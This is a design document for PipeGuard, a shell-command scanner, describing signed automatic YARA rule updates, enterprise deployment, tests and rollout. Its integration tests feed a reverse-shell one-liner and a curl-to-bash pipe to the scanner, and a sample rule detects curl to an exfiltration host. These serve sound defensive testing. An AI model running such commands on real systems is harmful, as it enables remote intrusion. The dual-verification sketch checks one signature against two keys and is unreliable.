# Automatic YARA Rule Updates Design

**Date:** 2026-01-13
**Status:** Implemented (2026-01-14)
**Authors:** Albert Hui, Eliza Wan

## 1. Overview

### Goals

1. **Individual Protection:** Keep users protected against emerging threats without manual rule downloads
2. **Enterprise Distribution:** Enable centralized rule management and custom rule deployment
3. **Security First:** Cryptographic verification prevents supply chain attacks
4. **Minimal Friction:** Updates happen transparently with smart notifications

### Target Audiences

**Individual Developers:**
- Want automatic protection against new threats
- Trust official PipeGuard releases
- Prefer "set and forget" with optional override
- Value simplicity over control

**Enterprise Security Teams:**
- Need centralized control over rule versions
- Want to test rules before deployment
- May have custom rules for internal threats
- Require audit trails and compliance

### Core Principles

1. **Security by default:** All updates cryptographically verified, hard fail on error
2. **Event-triggered:** Check on shell startup if >24hrs elapsed (no daemon)
3. **Graceful degradation:** Keep using old rules if updates fail
4. **Full transparency:** Users can inspect, rollback, or disable updates
5. **Privacy-preserving:** No telemetry without explicit opt-in

---

## 2. Architecture

### Update Trigger Mechanism

**Event-Triggered Checks (No Daemon):**

- Check runs during shell initialization (`precmd_functions` in zsh)
- Only if >24 hours since last check
- Non-blocking: happens in background, doesn't delay prompt
- TTY detection: skip checks in non-interactive scripts

**Why No Daemon:**
- Simpler architecture (fewer moving parts)
- Lower resource usage (no persistent process)
- No privilege escalation needed
- Users control when checks happen (shell startup)

### Distribution: GitHub Releases

**Release Artifacts:**
```
https://github.com/SecurityRonin/pipeguard/releases/download/rules-v1.1.0/
├── rules.yar           # Complete rule set
├── rules.yar.sig       # Ed25519 signature
├── metadata.json       # Version info, changelog
└── metadata.json.sig   # Metadata signature
```

**Metadata Format:**
```json
{
  "version": "1.1.0",
  "released_at": "2026-01-13T10:00:00Z",
  "rule_count": 58,
  "categories": 15,
  "changelog": [
    "Added 2 new AMOS stealer variants",
    "Improved ClickFix detection accuracy"
  ],
  "min_pipeguard_version": "0.8.0",
  "severity": "medium"
}
```

**Why GitHub Releases:**
- Immutable, versioned snapshots
- CDN distribution (fast, reliable)
- Transparent history (users can audit changes)
- Free hosting for open source
- Simple HTTP API (no complex SDK)

### Storage: Versioned Local Cache

**Directory Structure:**
```
~/.config/pipeguard/rules/
├── versions/
│   ├── 1.0.0/
│   │   ├── core.yar
│   │   ├── metadata.json
│   │   └── .verified  # Marker file
│   ├── 1.1.0/
│   │   ├── core.yar
│   │   ├── metadata.json
│   │   └── .verified
│   └── 1.2.0/
│       ├── core.yar
│       ├── metadata.json
│       └── .verified
├── active -> versions/1.2.0  # Symlink to active version
└── .metadata
    ├── last_check_timestamp
    ├── update_history.jsonl
    └── failed_versions.log
```

**Version Management:**
- Keep last 3 versions (configurable)
- Symlink `active/` points to current version
- Rollback changes symlink target
- Cleanup removes oldest versions beyond retention limit

**Why Versioned Storage:**
- Instant rollback (just change symlink)
- Bisect bad updates (try different versions)
- Audit history (see what changed when)
- No git overhead (simpler for 90% of users)

### Implementation: Pure Rust

**Why Rust:**
- Native HTTP client (`reqwest`) - no shell execution
- Built-in crypto (`ed25519-dalek`)
- Memory safety (no buffer overflows)
- Cross-platform (macOS, Linux, BSD)
- Single binary deployment

**Update Flow:**
```rust
pub struct UpdateManager {
    config: UpdateConfig,
    storage: VersionedStorage,
    crypto: CryptoVerifier,
}

impl UpdateManager {
    pub async fn check_for_updates(&self) -> Result<Option<UpdateInfo>> {
        let latest = self.fetch_latest_version().await?;
        let current = self.storage.current_version()?;

        if latest > current {
            Ok(Some(UpdateInfo {
                version: latest,
                severity: self.fetch_metadata(&latest).await?.severity,
            }))
        } else {
            Ok(None)
        }
    }

    pub async fn apply_update(&self, version: &str) -> Result<()> {
        // Download
        let (rules, signature) = self.download_release(version).await?;

        // Verify (hard fail if invalid)
        self.crypto.verify(&rules, &signature)?;

        // Store
        let version_path = self.storage.create_version_dir(version)?;
        self.storage.write_rules(&version_path, &rules)?;

        // Activate
        self.storage.activate_version(version)?;

        // Cleanup
        self.storage.cleanup_old_versions(3)?;

        Ok(())
    }
}
```

---

## 3. Configuration & User Experience

### Configuration File

**Location:** `~/.config/pipeguard/config.toml`

```toml
[update]
enabled = true                    # Master switch
auto_apply = false                # Prompt before applying (conservative default)
check_interval_hours = 24         # How often to check
source = "https://github.com/SecurityRonin/pipeguard/releases"
keep_versions = 3                 # Retention policy

[update.notifications]
severity_threshold = "medium"     # low|medium|high|critical
show_changelog = true
show_once_per_version = true      # Don't spam on every startup

[update.enterprise]
# MDM can lock these settings
allow_user_override = true
custom_source = ""                # Override GitHub with internal server
require_dual_verification = false # Enterprise + official signatures
```

### Notification Flow

**When Update Available:**

```
╭─────────────────────────────────────────────────╮
│ PipeGuard Rule Update Available: v1.1.0         │
│                                                 │
│ Priority: Medium                                │
│ Changes:                                        │
│   • 2 new AMOS stealer variants detected       │
│   • Improved ClickFix campaign accuracy        │
│                                                 │
│ Commands:                                       │
│   pipeguard update --apply      # Install now  │
│   pipeguard update --later      # Skip once    │
│   pipeguard update --disable    # Stop checks  │
│                                                 │
│ Learn more: pipeguard update --info v1.1.0     │
╰─────────────────────────────────────────────────╯
```

**Smart Notification Rules:**
- Show once per version (use `~/.config/pipeguard/.shown_v1.1.0` marker)
- Escalate urgency over time:
  - Day 1-7: "Medium" priority
  - Day 8-14: "High" priority
  - Day 15+: "Critical" priority
- Silent for "low" severity unless 30+ days old

### CLI Commands

```bash
# Check for updates
pipeguard update --check

# Apply update (with prompt if auto_apply=false)
pipeguard update --apply

# View update info before applying
pipeguard update --info v1.1.0

# List available versions
pipeguard update --list

# Rollback to previous version
pipeguard update --rollback 1.0.0

# View update history
pipeguard update --history

# Disable automatic checks
pipeguard update --disable

# Re-enable automatic checks
pipeguard update --enable
```

---

## 4. Security

### Cryptographic Verification (Ed25519)

**Why Ed25519:**
- Fast verification (~0.5ms)
- Small signatures (64 bytes)
- Small public keys (32 bytes)
- Immune to timing attacks
- Widely trusted (used by SSH, Signal, WireGuard)

**Implementation:**
```rust
use ed25519_dalek::{PublicKey, Signature, Verifier};

const PIPEGUARD_PUBLIC_KEY: &[u8] = include_bytes!("../keys/pipeguard-release.pub");

pub fn verify_rules_signature(rules: &[u8], signature: &[u8]) -> Result<()> {
    let public_key = PublicKey::from_bytes(PIPEGUARD_PUBLIC_KEY)
        .context("Invalid public key format")?;

    let signature = Signature::from_bytes(signature)
        .context("Invalid signature format")?;

    public_key.verify(rules, &signature)
        .map_err(|_| anyhow!("Signature verification failed: rules may be tampered"))
}
```

**Key Management:**
- Private key stored in hardware security module (offline)
- Public key embedded in PipeGuard binary at compile time
- No network fetch of keys (prevents MITM)
- Key rotation process documented but rarely needed

### Release Signing Process

**Maintainer Workflow:**
```bash
#!/bin/bash
# scripts/sign-release.sh

VERSION="1.1.0"
RULES_FILE="rules/core.yar"
PRIVATE_KEY="$HOME/.ssh/pipeguard-release.key"  # Hardware key

# Generate signature
openssl pkeyutl -sign \
  -inkey "$PRIVATE_KEY" \
  -rawin -in "$RULES_FILE" \
  -out "releases/rules-v${VERSION}/rules.yar.sig"

# Create metadata
cat > "releases/rules-v${VERSION}/metadata.json" <<EOF
{
  "version": "${VERSION}",
  "released_at": "$(date -Iseconds)",
  "rule_count": $(grep -c '^rule ' "$RULES_FILE"),
  "changelog": ["..."],
  "min_pipeguard_version": "0.8.0"
}
EOF

# Sign metadata
openssl pkeyutl -sign \
  -inkey "$PRIVATE_KEY" \
  -rawin -in "releases/rules-v${VERSION}/metadata.json" \
  -out "releases/rules-v${VERSION}/metadata.json.sig"

# Upload to GitHub Releases
gh release create "rules-v${VERSION}" \
  "releases/rules-v${VERSION}/*" \
  --title "YARA Rules v${VERSION}" \
  --notes-file "releases/rules-v${VERSION}/CHANGELOG.md"
```

### Verification Failure Handling

**Hard Fail Policy:**
- Signature verification failures are **never ignored**
- No "continue anyway" option
- No timeout-based bypasses
- Update aborted immediately, old rules remain active

**Error Messages:**
```
ERROR: Rule signature verification failed

This could indicate:
  • Network corruption during download
  • Malicious tampering with rule files
  • Man-in-the-middle attack

Action taken:
  ✗ Update aborted
  ✓ Previous rules (v1.0.0) still active
  ✓ System remains protected

Next steps:
  1. Check network connection
  2. Retry: pipeguard update --apply
  3. Report issue: https://github.com/SecurityRonin/pipeguard/issues

DO NOT disable signature verification.
```

### Degraded Mode: No Updates Available

**Scenario:** Network failure, GitHub outage, or sustained verification failures

**Behavior:**
- Keep using last verified rules
- Escalate warnings over time:
  - Day 1-7: No warning (transient failures are normal)
  - Day 8-14: `[WARN] Rules haven't updated in 10 days`
  - Day 15-30: `[WARN] Rules haven't updated in 20 days (may miss new threats)`
  - Day 31+: `[CRITICAL] Rules 31+ days old. Check network: pipeguard update --check`

**Why Not Disable Protection:**
- Old rules still catch most threats
- Better than no protection
- User maintains agency (can manually disable if needed)

---

## 5. Enterprise Integration

### MDM-Managed Configuration

**Deployment via Jamf/Intune/Kandji:**

```toml
# /Library/Managed Preferences/com.securityronin.pipeguard.plist
# (converted from TOML for this example)

[update]
enabled = true
auto_apply = true              # Enterprise: auto-apply after testing
check_interval_hours = 6       # More frequent checks
source = "https://rules.company.internal/releases"  # Internal server

[update.enterprise]
allow_user_override = false    # Users cannot change settings
custom_source = "https://rules.company.internal/releases"
require_dual_verification = true

[response]
# Lock down response policy
low = "warn"
medium = "block"
high = "block"
allow_override = false
```

**MDM Managed vs User Config:**
- MDM settings take precedence
- User config read-only if `allow_user_override = false`
- Clear indicator in `pipeguard status`: `Configuration: MDM-managed (locked)`

### Custom Enterprise Rules

**Workflow for Custom Internal Rules:**

1. **Create Custom Rules:**
   ```yara
   rule internal_threat_indicators {
       meta:
           severity = 9
           description = "Internal threat patterns (confidential)"
           category = "internal"
       strings:
           $internal1 = "company-secret-backdoor" nocase
           $internal2 = /curl.*internal-exfil-server\.company\.internal/
       condition:
           any of them
   }
   ```

2. **Sign with Enterprise Key:**
   ```bash
   # Enterprise has their own Ed25519 keypair
   openssl pkeyutl -sign \
     -inkey /path/to/company-release.key \
     -rawin -in custom-rules.yar \
     -out custom-rules.yar.sig
   ```

3. **Deploy via Internal Server:**
   ```
   https://rules.company.internal/releases/v1.0.0-company/
   ├── rules.yar           # Official rules + custom rules
   ├── rules.yar.sig       # Signed with company key
   └── metadata.json
   ```

4. **Configure Dual Verification:**
   ```toml
   [update.enterprise]
   require_dual_verification = true
   company_public_key = "/etc/pipeguard/company-release.pub"
   ```

**Dual Verification Logic:**
```rust
pub fn verify_enterprise_rules(&self, rules: &[u8], sig: &[u8]) -> Result<()> {
    // Must pass BOTH verifications
    verify_with_key(rules, sig, PIPEGUARD_PUBLIC_KEY)?;
    verify_with_key(rules, sig, self.company_public_key)?;
    Ok(())
}
```

**Why Dual Verification:**
- Ensures official PipeGuard rules are included (can't remove them)
- Adds company-specific rules on top
- Prevents rogue internal updates (needs both signatures)

---

## 6. Implementation Details

### Rust Module Structure

```
src/update/
├── mod.rs              # Public API: UpdateManager
├── checker.rs          # Version checking logic
├── downloader.rs       # HTTP downloads via reqwest
├── crypto.rs           # Ed25519 verification
├── storage.rs          # Versioned filesystem management
├── metadata.rs         # Parse/validate metadata.json
└── cli.rs              # Subcommands: update --check, --apply, etc.
```

### Dependencies (Cargo.toml)

```toml
[dependencies]
# Existing
yara-rust = "0.25"
clap = { version = "4.5", features = ["derive"] }
anyhow = "1.0"
toml = "0.8"

# New for updates
reqwest = { version = "0.12", features = ["blocking", "json"] }
ed25519-dalek = "2.1"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
chrono = "0.4"

[dev-dependencies]
mockito = "1.5"  # Mock HTTP server for tests
tempfile = "3.10"
```

### Core Update Flow

```rust
// src/update/mod.rs

use anyhow::{Context, Result};
use reqwest::blocking::Client;
use std::path::PathBuf;

pub struct UpdateManager {
    config: UpdateConfig,
    storage: VersionedStorage,
    crypto: CryptoVerifier,
    http_client: Client,
}

impl UpdateManager {
    pub fn new(config: UpdateConfig) -> Result<Self> {
        Ok(Self {
            config,
            storage: VersionedStorage::new(dirs::config_dir()
                .context("No config dir")?
                .join("pipeguard/rules"))?,
            crypto: CryptoVerifier::new()?,
            http_client: Client::builder()
                .timeout(std::time::Duration::from_secs(30))
                .build()?,
        })
    }

    pub fn check_for_updates(&self) -> Result<Option<UpdateInfo>> {
        // Fetch latest version from GitHub API
        let latest = self.fetch_latest_version()?;
        let current = self.storage.current_version()?;

        if latest.version > current {
            Ok(Some(latest))
        } else {
            Ok(None)
        }
    }

    pub fn apply_update(&self, version: &str) -> Result<()> {
        // Download rules and signature
        let rules_url = format!("{}/releases/download/rules-v{}/rules.yar",
                                self.config.source, version);
        let sig_url = format!("{}/releases/download/rules-v{}/rules.yar.sig",
                              self.config.source, version);

        let rules = self.http_client.get(&rules_url)
            .send()?
            .bytes()?;
        let signature = self.http_client.get(&sig_url)
            .send()?
            .bytes()?;

        // Verify signature (hard fail on error)
        self.crypto.verify(&rules, &signature)
            .context("Signature verification failed - update aborted")?;

        // Create version directory
        let version_path = self.storage.create_version_dir(version)?;

        // Write rules with .verified marker
        self.storage.write_rules(&version_path, &rules)?;
        std::fs::write(version_path.join(".verified"), "")?;

        // Atomically switch active symlink
        self.storage.activate_version(version)?;

        // Cleanup old versions (keep last 3)
        self.storage.cleanup_old_versions(self.config.keep_versions)?;

        // Log success
        self.log_update_success(version)?;

        Ok(())
    }

    pub fn rollback(&self, version: &str) -> Result<()> {
        // Verify target version exists and is verified
        if !self.storage.is_verified(version)? {
            anyhow::bail!("Version {} not found or not verified", version);
        }

        // Switch symlink
        self.storage.activate_version(version)?;

        eprintln!("✓ Rolled back to rules v{}", version);
        Ok(())
    }
}
```

### Shell Integration Hook

**zsh/bash integration** (added to `.zshrc` by installer):

```bash
# PipeGuard automatic update check
_pipeguard_check_update() {
    # Skip if not interactive
    [[ -t 0 ]] || return 0

    local config_dir="${XDG_CONFIG_HOME:-$HOME/.config}/pipeguard"
    local last_check="$config_dir/.last_check"
    local now=$(date +%s)

    # Check if >24 hours since last check
    if [[ -f "$last_check" ]]; then
        local last=$(cat "$last_check" 2>/dev/null || echo 0)
        local elapsed=$(( (now - last) / 3600 ))

        if [[ $elapsed -lt 24 ]]; then
            return 0  # Too soon
        fi
    fi

    # Update timestamp
    mkdir -p "$config_dir"
    echo "$now" > "$last_check"

    # Check for updates (silent, fast)
    pipeguard update --check --silent
    local status=$?

    # status codes: 0=up-to-date, 1=update-available, 2=error
    if [[ $status -eq 1 ]]; then
        pipeguard update --notify
    fi
}

# Add to precmd (zsh) or PROMPT_COMMAND (bash)
if [[ -n "$ZSH_VERSION" ]]; then
    precmd_functions+=(_pipeguard_check_update)
elif [[ -n "$BASH_VERSION" ]]; then
    PROMPT_COMMAND="_pipeguard_check_update${PROMPT_COMMAND:+;$PROMPT_COMMAND}"
fi
```

---

## 7. Testing & Validation Strategy

### Unit Testing

**Crypto Verification Tests:**
```rust
#[cfg(test)]
mod crypto_tests {
    use super::*;

    #[test]
    fn test_valid_signature() {
        let rules = b"rule test { condition: true }";
        let signature = sign_with_private_key(rules);
        assert!(verify_rules_signature(rules, &signature).is_ok());
    }

    #[test]
    fn test_invalid_signature_fails() {
        let rules = b"rule test { condition: true }";
        let bad_sig = [0u8; 64];
        assert!(verify_rules_signature(rules, &bad_sig).is_err());
    }

    #[test]
    fn test_tampered_rules_fail() {
        let rules = b"rule test { condition: true }";
        let signature = sign_with_private_key(rules);
        let tampered = b"rule evil { condition: true }";
        assert!(verify_rules_signature(tampered, &signature).is_err());
    }

    #[test]
    fn test_no_signature_bypass() {
        // Ensure there's no code path that skips verification
        let rules = b"rule test { condition: true }";
        let result = UpdateManager::apply_update_without_signature(rules);
        assert!(result.is_err());
    }
}
```

**Versioned Storage Tests:**
```rust
#[cfg(test)]
mod storage_tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_version_rollback() {
        let dir = tempdir().unwrap();
        let storage = VersionedStorage::new(dir.path()).unwrap();

        storage.create_version("1.0.0", rules_v1).unwrap();
        storage.create_version("1.1.0", rules_v2).unwrap();
        storage.activate_version("1.1.0").unwrap();

        // Rollback to 1.0.0
        storage.activate_version("1.0.0").unwrap();
        assert_eq!(storage.current_version().unwrap(), "1.0.0");
    }

    #[test]
    fn test_cleanup_keeps_latest_3() {
        let dir = tempdir().unwrap();
        let storage = VersionedStorage::new(dir.path()).unwrap();

        for i in 0..5 {
            storage.create_version(&format!("1.{}.0", i), rules).unwrap();
        }
        storage.cleanup_old_versions(3).unwrap();

        assert!(storage.has_version("1.4.0"));
        assert!(storage.has_version("1.3.0"));
        assert!(storage.has_version("1.2.0"));
        assert!(!storage.has_version("1.1.0"));
        assert!(!storage.has_version("1.0.0"));
    }

    #[test]
    fn test_atomic_activation() {
        let dir = tempdir().unwrap();
        let storage = VersionedStorage::new(dir.path()).unwrap();

        storage.create_version("1.0.0", rules_v1).unwrap();
        storage.create_version("1.1.0", rules_v2).unwrap();

        // Simulate crash during activation
        // Symlink should either point to old or new, never broken
        storage.activate_version("1.1.0").unwrap();
        assert!(dir.path().join("active").read_link().is_ok());
    }
}
```

### Integration Testing

**Update Flow Tests:**
```bash
#!/bin/bash
# tests/integration/test_update_flow.sh

set -euo pipefail

test_successful_update() {
    echo "Testing successful update flow..."

    # Setup mock GitHub API
    mockito start --port 8080
    mockito mock GET /repos/SecurityRonin/pipeguard/releases/latest \
        --response-file tests/fixtures/github_release.json
    mockito mock GET /releases/download/rules-v1.1.0/rules.yar \
        --response-file tests/fixtures/rules_v1.1.0.yar
    mockito mock GET /releases/download/rules-v1.1.0/rules.yar.sig \
        --response-file tests/fixtures/rules_v1.1.0.sig

    # Configure to use mock server
    export PIPEGUARD_UPDATE_SOURCE="http://localhost:8080"

    # Run update check
    pipeguard update --check
    assert_exit_code 1  # Update available

    # Apply update
    pipeguard update --apply
    assert_exit_code 0

    # Verify new version active
    assert_file_exists "$HOME/.config/pipeguard/rules/versions/1.1.0/core.yar"
    assert_symlink_target "$HOME/.config/pipeguard/rules/active" "1.1.0"

    mockito stop
    echo "✓ Successful update test passed"
}

test_failed_verification() {
    echo "Testing signature verification failure..."

    # Setup mock with bad signature
    mockito start --port 8080
    mockito mock GET /releases/download/rules-v1.1.0/rules.yar.sig \
        --response-body "invalid_signature_data"

    # Attempt update
    pipeguard update --apply 2>&1 | tee output.log
    assert_exit_code 2  # Verification failed
    assert_log_contains "Signature verification failed"

    # Verify old version still active
    assert_symlink_target "$HOME/.config/pipeguard/rules/active" "1.0.0"

    mockito stop
    echo "✓ Failed verification test passed"
}

test_network_failure() {
    echo "Testing network failure handling..."

    # Simulate network down
    export PIPEGUARD_UPDATE_SOURCE="http://localhost:9999"  # Nothing listening

    # Attempt update
    pipeguard update --check 2>&1 | tee output.log
    assert_exit_code 3  # Network error
    assert_log_contains "Network error"

    # Verify old rules still work
    echo "curl | bash" | pipeguard scan --stdin
    assert_exit_code 10  # Detection still works

    echo "✓ Network failure test passed"
}

test_rollback() {
    echo "Testing rollback functionality..."

    # Setup versions 1.0.0 and 1.1.0
    pipeguard update --apply  # Install 1.1.0
    assert_symlink_target "$HOME/.config/pipeguard/rules/active" "1.1.0"

    # Rollback
    pipeguard update --rollback 1.0.0
    assert_exit_code 0
    assert_symlink_target "$HOME/.config/pipeguard/rules/active" "1.0.0"

    # Verify rules work
    echo "bash -i >& /dev/tcp/10.0.0.1/4444" | pipeguard scan --stdin
    assert_exit_code 10  # Reverse shell detected with old rules

    echo "✓ Rollback test passed"
}

# Run all tests
test_successful_update
test_failed_verification
test_network_failure
test_rollback

echo "✓ All integration tests passed"
```

### Manual Testing Checklist

**Individual User Scenarios:**
- [ ] Fresh install with no prior rules
- [ ] Update check from version 1.0.0 to 1.1.0
- [ ] Auto-apply with `auto_apply = true`
- [ ] Prompt mode with `auto_apply = false`
- [ ] Network timeout during download
- [ ] Signature verification failure
- [ ] Disk space exhaustion during update
- [ ] Manual rollback via `pipeguard update --rollback 1.0.0`
- [ ] Disable/enable automatic checks
- [ ] View update history and changelog

**Enterprise Scenarios:**
- [ ] MDM-deployed config with custom GitHub URL
- [ ] MDM-deployed config with custom Git repository
- [ ] Locked config (`allow_user_override = false`)
- [ ] Dual verification for enterprise rules
- [ ] Update during active scanning (race conditions)
- [ ] Custom internal rules deployment
- [ ] Rollback across multiple machines via MDM

**Shell Integration:**
- [ ] Update check on zsh startup
- [ ] Update check on bash startup
- [ ] Non-interactive script (should skip check)
- [ ] SSH session without TTY
- [ ] Tmux/screen session behavior
- [ ] Performance: shell startup delay <100ms

**Edge Cases:**
- [ ] Multiple shells open (concurrent updates)
- [ ] Filesystem full during download
- [ ] GitHub API rate limiting
- [ ] IPv6-only network
- [ ] Proxy/firewall interference
- [ ] Clock skew (system time incorrect)
- [ ] Corrupted symlink recovery

---

## 8. Rollout Plan

### Phase 1: Alpha Testing (Week 1-2)

**Target Audience:** Project maintainers and 5-10 early adopters

**Goals:**
- Validate core update mechanism
- Test cryptographic verification
- Identify edge cases in network/filesystem handling
- Stress test version storage and rollback

**Release Artifacts:**
- GitHub Release `v1.1.0-alpha.1`
- Test rule set signed with production keys
- Alpha testing guide with known issues
- Automated test harness

**Success Criteria:**
- ✓ Zero signature verification bypasses
- ✓ Clean rollback after simulated bad update
- ✓ No data loss or corruption
- ✓ Update completes in <30 seconds on typical network
- ✓ Shell integration works on zsh/bash on macOS 13-15

**Testing Protocol:**
```bash
# Alpha testers run daily
pipeguard update --check
pipeguard update --apply
pipeguard update --rollback $(pipeguard update --list | head -2 | tail -1)

# Report results
pipeguard diagnose --upload
```

### Phase 2: Beta Testing (Week 3-4)

**Target Audience:** 50-100 volunteer users from GitHub community

**Goals:**
- Validate shell integration across environments (zsh/bash/fish)
- Test notification UX and decision flow
- Measure real-world network reliability
- Enterprise pilot with 2-3 organizations

**Release Artifacts:**
- GitHub Release `v1.1.0-beta.1`
- Updated documentation with enterprise setup guide
- Homebrew formula update (beta channel)
- Beta feedback survey

**Success Criteria:**
- ✓ <5% users report friction or confusion
- ✓ Shell integration works on macOS 13-15, Linux, BSD
- ✓ Enterprise pilot successfully deploys via MDM (Jamf/Intune)
- ✓ Update check adds <100ms to shell startup
- ✓ No reports of signature verification bypass

**Enterprise Pilot:**
- Partner with 2-3 companies (50-200 developers each)
- Deploy via MDM with internal rule server
- Collect feedback on dual verification workflow
- Measure adoption rate and false positive reports

### Phase 3: Stable Release (Week 5-6)

**Target Audience:** All users via Homebrew stable channel

**Rollout Strategy:**
- Day 1: GitHub release announcement
- Day 2: Homebrew stable channel update
- Day 3: Blog post on securityronin.com
- Day 4: Social media (Twitter/X, LinkedIn, Reddit r/netsec)
- Day 5-7: Outreach to security mailing lists (Full Disclosure, etc.)
- Week 2: Monitor GitHub issues, respond to feedback

**Default Configuration:**
```toml
[update]
enabled = true
auto_apply = false          # Conservative default (prompt first)
check_interval_hours = 24
source = "https://github.com/SecurityRonin/pipeguard/releases"
notify_severity = "medium"  # Don't spam on low-priority updates
```

**Monitoring:**
- **Adoption Rate:** Track GitHub download stats (expect 40-60% adoption in first month)
- **Issue Reports:** Monitor GitHub issues for common failure modes
- **Update Success Rate:** Collect anonymous telemetry (opt-in only):
  - Update attempts vs. successes
  - Common failure reasons (network, verification, etc.)
  - Version distribution across fleet

**Success Metrics (30 days post-release):**
- ✓ 50%+ adoption among active users
- ✓ <2% unresolved critical issues
- ✓ >95% update success rate
- ✓ <10 false positive reports related to updates

**Rollback Plan:**
If critical issues emerge:
1. Pull GitHub release (stop new downloads)
2. Post incident report within 4 hours
3. Release hotfix within 24 hours
4. Automated rollback notification to affected users

---

## 9. Future Enhancements

### 9.1 Threat Intelligence Integration

**Concept:** Subscribe to community threat feeds for real-time emerging threats

**Implementation:**
```toml
[threat_intel]
enabled = true
sources = [
    "https://rules.emergingthreats.net/open/",
    "https://github.com/reversinglabs/reversinglabs-yara-rules",
]
auto_merge = false          # Require manual review before activating
trust_level = "community"   # Official rules take precedence
```

**Workflow:**
1. PipeGuard downloads community rules daily
2. Merges with official rules (official takes precedence on conflicts)
3. User reviews new rules: `pipeguard rules review --pending`
4. Activate after review: `pipeguard rules activate --source emergingthreats`

**Benefits:**
- Faster response to zero-day threats
- Community-driven protection
- Optional for privacy-conscious users

**Challenges:**
- Trust model for third-party sources (mitigation: require manual activation)
- Rule quality variance (mitigation: severity downgrade for community rules)
- Potential for false positives (mitigation: easy rollback, per-source disable)

### 9.2 Machine Learning Augmentation

**Concept:** Complement YARA rules with ML-based anomaly detection

**Approach:**
- Train lightweight model (XGBoost, <5MB) on known benign installers
- Extract features: base64 ratio, entropy, suspicious function calls, network activity
- Flag unusual patterns as additional signal (not primary detection)
- Use as "suspiciousness score" to adjust severity

**Benefits:**
- Catch novel attack patterns not covered by rules
- Reduce false negatives for heavily obfuscated threats
- Adapt to new evasion techniques without rule updates

**Challenges:**
- Model size and performance overhead (target: <50ms additional latency)
- Training data collection and labeling (need 10K+ samples)
- Explainability for user decisions (must show why flagged)
- False positive rate control (ML can be noisy)

**Phase 1 (Research):**
- Collect benign corpus (installers, dev tools, system scripts)
- Collect malware corpus (from MalwareBazaar, VirusTotal)
- Train baseline model, measure accuracy

**Phase 2 (Pilot):**
- Integrate as opt-in "experimental" feature
- Collect feedback from alpha users
- Tune threshold to match <0.5% false positive rate

**Not Planned for v1.0** - requires significant research and validation.

### 9.3 Differential Updates

**Concept:** Download only changed rules instead of full rule set

**Implementation:**
```bash
# Instead of downloading entire core.yar (50KB)
# Download diff from 1.0.0 to 1.1.0 (2KB)
GET /releases/rules-v1.1.0/rules-diff-from-1.0.0.patch
GET /releases/rules-v1.1.0/rules-diff-from-1.0.0.patch.sig
```

**Algorithm:**
```rust
pub fn apply_differential_update(&self, patch: &[u8]) -> Result<()> {
    let current_rules = self.storage.read_active_rules()?;
    let patched_rules = apply_patch(&current_rules, patch)?;

    // Verify patched result matches expected hash
    let expected_hash = self.fetch_metadata()?.sha256;
    let actual_hash = sha256(&patched_rules);
    if expected_hash != actual_hash {
        anyhow::bail!("Patch verification failed");
    }

    // Continue normal update flow
    self.storage.write_rules(&patched_rules)?;
    Ok(())
}
```

**Benefits:**
- Reduced bandwidth (important for mobile/metered connections)
- Faster updates (2KB vs 50KB)
- Lower CDN costs (GitHub has limits)

**Trade-offs:**
- Increased complexity in update logic
- Need to maintain diffs for multiple source versions (1.0→1.1, 0.9→1.1, etc.)
- Patch verification adds computation overhead
- May not be worth it until rule set grows significantly (>500KB)

**Decision:** Not in v1.0. Revisit when rule set exceeds 100KB or bandwidth costs become significant.

### 9.4 Collaborative Rule Refinement

**Concept:** Allow users to submit false positive reports and rule improvements

**Workflow:**
1. User encounters false positive (legitimate script blocked)
2. Run `pipeguard report --false-positive --script install.sh`
3. PipeGuard sanitizes diagnostic bundle:
   - Includes: rule ID, severity, matched strings (hashed)
   - Excludes: script content, URLs, environment variables
4. Upload to secure endpoint (authenticated, rate-limited)
5. Maintainers review and adjust rules
6. Fixed rules distributed in next release

**Privacy Considerations:**
- Sanitize diagnostic data (no command history, URLs, credentials)
- Opt-in only (default: disabled)
- Clear disclosure of what's collected
- User can review bundle before upload: `pipeguard report --preview`

**Security Considerations:**
- Rate limiting (max 5 reports per day per user)
- Authentication (GitHub OAuth or API key)
- Abuse detection (ban spam/malicious reports)

**Implementation:**
```bash
pipeguard report --false-positive \
  --rule amos_stealer_indicators \
  --script /tmp/install.sh \
  --context "Homebrew formulae installation"

# Generates sanitized bundle
Report ID: fp-2026-01-13-a3f9c8
Rule: amos_stealer_indicators
Context: Homebrew formulae installation
Matched strings (hashed): sha256:8a3f9c...

Upload? [y/N] y
✓ Report submitted. Track at: https://github.com/SecurityRonin/pipeguard/issues/123
```

### 9.5 Enterprise Analytics Dashboard

**Concept:** Centralized visibility for enterprise deployments

**Features:**
- Aggregate detection statistics across fleet
- Rule version distribution (which machines on which versions)
- Update compliance tracking (% machines up-to-date)
- Threat trend visualization (which threats most common)
- Anomaly detection (spikes in detections)

**Architecture:**
- Optional telemetry endpoint in config
- Agents POST anonymized detection events (no command content)
- Dashboard queries aggregated data via API
- No PII or command content transmitted

**Configuration:**
```toml
[enterprise.analytics]
enabled = true
endpoint = "https://analytics.company.internal/pipeguard"
batch_interval_minutes = 60
anonymize = true  # Hash machine IDs, remove user info
```

**Example Dashboard:**
```
╭───────────────────────────────────────────────╮
│ PipeGuard Fleet Dashboard                    │
│                                               │
│ Total Machines: 1,247                         │
│ Up-to-date: 1,189 (95.3%)                    │
│ Outdated: 58 (4.7%)                          │
│                                               │
│ Detections (Last 7 Days): 43                 │
│   High severity: 2                           │
│   Medium severity: 15                        │
│   Low severity: 26                           │
│                                               │
│ Top Threats:                                 │
│   1. Shell profile modification (12)         │
│   2. Obfuscated base64 (8)                  │
│   3. Reverse shell patterns (2)             │
│                                               │
│ Rule Version Distribution:                   │
│   v1.2.0: 1,189 machines (95.3%)            │
│   v1.1.0: 52 machines (4.2%)                │
│   v1.0.0: 6 machines (0.5%)                 │
╰───────────────────────────────────────────────╯
```

**Business Model:** Part of PipeGuard Pro subscription (not open source)

**Privacy:** Fully anonymized, GDPR-compliant, opt-in only

---

## 10. Decision Log

**Key Decisions Made During Design:**

| Decision | Options Considered | Choice | Rationale |
|----------|-------------------|--------|-----------|
| Update trigger | Daemon vs event-triggered | Event-triggered | Simpler, lower resource usage, user control |
| Distribution | GitHub Releases vs Git vs CDN | GitHub Releases | Immutable, versioned, free for OSS |
| Storage | Single file vs versioned | Versioned (keep 3) | Enables rollback, audit history |
| Trust model | Tiered vs uniform | Tiered (individuals vs enterprise) | Different needs, different controls |
| Crypto | Ed25519 vs RSA vs none | Ed25519 mandatory | Fast, secure, no bypass |
| Verification failure | Hard fail vs fallback | Hard fail | Security over convenience |
